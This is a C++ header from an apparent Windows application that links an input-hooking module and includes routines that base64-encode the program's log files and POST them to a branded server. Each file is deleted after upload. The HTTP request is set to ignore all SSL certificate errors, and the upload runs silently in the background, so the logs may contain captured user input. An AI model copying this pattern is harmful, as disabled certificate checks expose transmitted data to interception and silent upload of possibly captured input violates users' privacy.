#pragma once

#include "httprequest.h"
#include "win-firewall.h"
#include <utility>
#include <string>
#include <atlbase.h>
#include <comutil.h>

#include <boost/archive/iterators/base64_from_binary.hpp>
#include <boost/archive/iterators/insert_linebreaks.hpp>
#include <boost/archive/iterators/transform_width.hpp>
#include <boost/archive/iterators/ostream_iterator.hpp>
#include <boost/archive/iterators/istream_iterator.hpp>
#include <boost/archive/iterators/remove_whitespace.hpp>
#include <boost/archive/iterators/binary_from_base64.hpp>


#include <experimental/resumable>
#include <future>
#include <filesystem>
#include "log-helpers.h"
#include "logger.h"
#include "InputHooker/input-hooker.h"
#include "win-reg.h"
#include "app-id.h"

namespace
{
    const size_t fileSizeToSplit = 512000; // do not split log anymore if its size less then this
}

template<class Out_t, class In_t>
Out_t encodeToBase64(In_t const& text)
{
    using namespace boost::archive::iterators;
    using base64_text = insert_linebreaks<base64_from_binary<transform_width<typename In_t::const_iterator, 6, sizeof(In_t::value_type) * 8> >, 72 >;

    Out_t encodedStr;
    encodedStr.reserve((text.size() / 3 + 1) * 4 + (text.size() / 72) * 2 + 1); // a byte for each 6 bits + line-breaks
    std::copy(
        base64_text(text.begin()),
        base64_text(text.end()),
        std::back_inserter(encodedStr)
    );

    return encodedStr;
}

template<class Out_t, class In_t>
Out_t decodeFromBase64(In_t base64Str)
{
    using namespace boost::archive::iterators;
    using unbase64_text = transform_width<binary_from_base64<remove_whitespace<typename In_t::const_iterator>>, sizeof(Out_t::value_type) * 8, 6>;

    size_t strSize = base64Str.find_last_not_of('=');
    if (strSize == In_t::npos)
        strSize = base64Str.size();
    Out_t decodedStr;
    if (strSize != 0) {
        decodedStr.reserve(strSize / 4 * 3 + 4);
        std::copy(
            unbase64_text(base64Str.begin()),
            unbase64_text(base64Str.begin() + strSize + 1),
            std::back_inserter(decodedStr)
        );
    }
    return decodedStr;
}

template <class Out_t>
Out_t readFileToString(std::tr2::sys::path const& filename)
{
    // FIXME: reading utf-8 is byte-to-wchar, it must be wchar-to-wchar, so next single string solution does not work for MSVC2013
    //return Out_t ((std::istreambuf_iterator<typename Out_t::value_type>(std::basic_ifstream<typename Out_t::value_type>(filename.string(), std::ios::binary))), std::istreambuf_iterator<typename Out_t::value_type>());

    Out_t readStr;
    if (std::tr2::sys::is_regular_file(filename, std::error_code())) {
        readStr.resize(std::tr2::sys::file_size(filename, std::error_code()) + 1, '\0');
        FILE* fReadFrom = fopen(filename.string().c_str(), "rb");
        if (fReadFrom) {
            size_t readCount = fread((void*)readStr.data(), sizeof(Out_t::value_type), readStr.size(), fReadFrom);
            fclose(fReadFrom);
            readStr.resize(readCount);
        } else {
            readStr.clear();
            readStr.shrink_to_fit();
        }
    }
    return readStr;
}

template<class T1>
std::wstring paramsToString(std::pair<const char*, T1>&& a)
{
    return std::wstring(a.first, a.first + strlen(a.first)) + _T("=") + //encodeToBase64<std::wstring>(a.second);
           std::wstring(a.second.begin(), a.second.end());
}

template<class T1, class ... Tn>
std::wstring paramsToString(std::pair<const char*, T1>&& first, std::pair<const char*, Tn>&& ... others)
{
    return paramsToString(std::move(first)) + _T("&") + paramsToString(std::move(others)...);
}

// explicit specialization for std::filesystem::path - enclose file content
template<>
std::wstring paramsToString(std::pair<const char*, std::tr2::sys::path>&& a)
{
    return std::wstring(a.first, a.first + strlen(a.first)) + _T("=") + encodeToBase64<std::wstring>(readFileToString<std::string>(a.second) + "\0");
}

inline void debugTrace(std::wstring const& logMsg)
{
#ifdef _DEBUG
    const auto timestampStr = timestamp(std::chrono::system_clock::now());
    const std::wstring wtimestamp(timestampStr.begin(), timestampStr.end());
    std::wofstream(Logger::instance().logFilename().parent_path() / L"inefan-debug.txt", std::ios::app) << wtimestamp << logMsg << L"\n";
#endif
}

template<class ... T>
std::future<bool> postData(std::wstring const& url, std::pair<const char*, T>&& ... key_values)
{
    auto postDataImpl = [&]() {
        CoInitialize(NULL);
        auto uninit = [](void*) {CoUninitialize(); };
        std::unique_ptr<void, decltype(uninit)> onRet((void*)1/*must be not nullptr*/, uninit);
        CComPtr<IWinHttpRequest> request;
        try {
            if (FAILED(request.CoCreateInstance(L"WinHttp.WinHttpRequest.5.1")))
                throw std::runtime_error("Cannot create HTTP request instance");
            if (FAILED(request->Open(_bstr_t(L"POST").GetBSTR(), _bstr_t(url.c_str()).GetBSTR(), _variant_t(false))))
                throw std::runtime_error("Cannot create open request");
            if (FAILED(request->SetRequestHeader(_bstr_t(L"Content-Type").GetBSTR(), _bstr_t(L"application/x-www-form-urlencoded").GetBSTR())))
                throw std::runtime_error("Cannot set request header");

            // ignore ssl errors
            request->put_Option(WinHttpRequestOption_SslErrorIgnoreFlags, _variant_t(SslErrorFlag_Ignore_All));

            const auto postData = paramsToString(std::move(key_values)...);
            debugTrace(std::wstring(L"posted\n") + postData);

            if (FAILED(request->Send(_variant_t(postData.c_str()))))
                throw std::runtime_error("Cannot send data");

            _bstr_t content;
            request->get_ResponseText(content.GetAddress());

            if (content.length() != 0) {
                std::wstring decodedReply;
                if (content.GetBSTR()) {
                    decodedReply = static_cast<wchar_t*>(content.GetBSTR());
                    debugTrace(std::wstring(L"received\n") + decodedReply);
                    // TODO: process request
                }
                return true;
            }

            return false;
        } catch(std::exception const& ee) {
            std::cerr << ee.what();
            //_bstr_t status;
            //request->get_StatusText(status.GetAddress());
            Logger::instance() << ee.what()// << "; request status is " << static_cast<LPWSTR>(status)
                               ;
        } catch(...) {std::cerr << "unhandled exception in" << __FUNCTION__;}
        return false;
    };

    return std::async(std::launch::async, postDataImpl);
}


void trySplitLog(std::tr2::sys::path const& logPath)
{
    try {
        using namespace std::tr2::sys;
        const auto fileSize = file_size(logPath, std::error_code());
        if (fileSize > fileSizeToSplit) {
            // split file into two
            {
                std::ifstream orig(logPath, std::ios::binary);
                std::ofstream part1(path(logPath).replace_extension("._0.txt"), std::ios::binary);
                std::ofstream part2(path(logPath).replace_extension("._1.txt"), std::ios::binary);

                std::copy_n(std::istreambuf_iterator<char>(orig), fileSize / 2, std::ostreambuf_iterator<char>(part1));
                std::find_if(++std::istreambuf_iterator<char>(orig), std::istreambuf_iterator<char>(), [&part1](char ch) { part1 << ch; return ch == '\n'; });
                std::copy(++std::istreambuf_iterator<char>(orig), std::istreambuf_iterator<char>(), std::ostreambuf_iterator<char>(part2));
            }
            remove(logPath, std::error_code());
        }
    } catch (std::exception const& ee) {
        std::cerr << ee.what();
    } catch (...) {
        std::cerr << "unhandled exception in" << __FUNCTION__;
    }
}

std::future<bool> postAllNewLogfiles()
{
    auto postNewLogs = [](const time_t postTime) {
        try {
            using namespace std::tr2::sys;
            // read last logs sent time
            RegistryHelper reg(HKEY_CURRENT_USER, _T("Software\\") _T(BRAND_COMPANYNAME) _T("\\") _T(BRAND_NAME));
            const time_t lastSentTime = std::stoull(std::wstring(L"0") + reg.readValue(_T("logsPostTime")));
            // get list of new files
            directory_iterator logDirIter(Logger::instance().logFilename().parent_path(), std::error_code());

            std::vector<std::future<void>> splitTasks;

            bool success = true;
            for (auto& log : logDirIter)
                if (log != Logger::instance().logFilename()) {
                    const time_t fileTime = std::chrono::system_clock::to_time_t(last_write_time(log));

                    if (is_regular_file(log, std::error_code()) && fileTime >= lastSentTime) {
                        //__yield_value
                        const bool local_success = postData(
                                                       _T("https://") _T(BRAND_DOMAIN) _T("/inefan/"),
                                                       std::make_pair("appId", appId()),
                                                       std::make_pair("logfile", log.path()),
                                                       std::make_pair("logName", log.path().filename().string())
                                                   ).get();
                        success = success && local_success;
                        if (local_success)
                            remove(log, std::error_code());
                        else
                            splitTasks.push_back(
                                std::async(std::launch::async, trySplitLog, path(log.path())));
                    } else
                        remove(log, std::error_code());
                }
            if (success)
                reg.writeValue(_T("logsPostTime"), std::to_wstring(postTime));
            return success;
        } catch (std::exception const& ee) {
            std::cerr << ee.what() << " at " << __FUNCTION__;
            Logger::instance() << ee.what() << " at " << __FUNCTION__;
        } catch (...) { std::cerr << "unknown exception at " << __FUNCTION__; }
        return false;
    };

    return std::async(std::launch::async, postNewLogs, time(0));
}